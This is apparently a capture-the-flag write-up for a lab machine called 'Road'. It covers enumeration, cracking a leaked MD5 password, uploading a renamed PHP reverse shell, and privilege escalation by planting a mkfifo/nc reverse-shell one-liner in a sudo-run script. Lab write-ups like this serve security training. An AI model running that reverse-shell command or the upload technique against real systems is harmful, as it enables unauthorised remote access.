# Road Write-up

## Initial Enumeration

The only initial information provided is an IP address. We begin by conducting an Nmap scan to identify open ports and services:

```bash
nmap -sC -sV -v {target_ip}
```

### Scan Results:
```
PORT   STATE SERVICE VERSION                                                                                                                         
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)                                                                    
| ssh-hostkey:                                                                                                                                       
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Scan Results:

Our scan reveals the server is running SSH and a Webpage.

## Webpage Enumeration

The webpage is a default page for Apache2 Ubuntu. Further enumeration with a gobuster scan reveals some important pages.

```bash
gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://10.10.166.211 -x .txt,.php
```

http://10.10.166.211/content/

![image](https://github.com/user-attachments/assets/fcf29936-ff08-4728-ac64-6bd47ba7811e)

```bash
gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://10.10.166.211/content -x .txt,.php
```

More enumeration on this page gives results but the important results are


/inc (Status: 301) [Size: 320] [--> http://10.10.166.211/content/inc/] -> A login page

/as  (Status: 301) [Size: 319] [--> http://10.10.166.211/content/as/] -> The included content which contains a sql backup!

Downloading and opening the SQL backup reveals information such as possible usernames and password hashes. Using crackstation, we find a match for an MD5 hash, possibly a password we could use.

Username: manager
Password: 42f749ade7f9e195bf475f37a44cafcb : Password123

Using these credentials on the login page found earlier, access to the cms is achieved!

### Reverse Shell

![image](https://github.com/user-attachments/assets/b006984d-8424-4dce-ba6a-00eab0d054dc)

Similiar to a technique to a technique I learned to get a WordPress reverse shell, uploading a php reverse shell file (with a renamed type to avoid filters) means a reverse shell can be made with a nc listener.

Uploading our shell and clicking on the file after starting the listener gives a shell with user 

```bash
nc -lvnp 8080
```

### First Flag
The first flag requires no further privilege escalation and can be found in the /home/itguy folder

$ cat user.txt

## Privilege Escalation

The first thing to check is any sudo priveleges the user has, in this case itguy can backup.pl which calls copy.sh.

![image](https://github.com/user-attachments/assets/31cf8c1c-a0d1-4686-8158-fe170a5fe433)

By editing copy.sh, the attacking machine can recieve the connection, gaining an elevated access shell. The only thing to change is the ip address in copy.sh.

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {local_ip} 1234 >/tmp/f

Running another nc listener

```bash
nc -lvnp 1234
```

The root flag is can be found in the root directory!

$ cat root.txt

### Notes:
Very simply box overall but lots of fundamentals, enumerate, enumerate, enumerate. The privilege escalation was easy but something I use to struggle with so I'm getting better.
I'd like to try out the exploitdb exploits next time I do something like this, I just recognized how to do this from previous boxes that had simple file upload vulnerabilities.
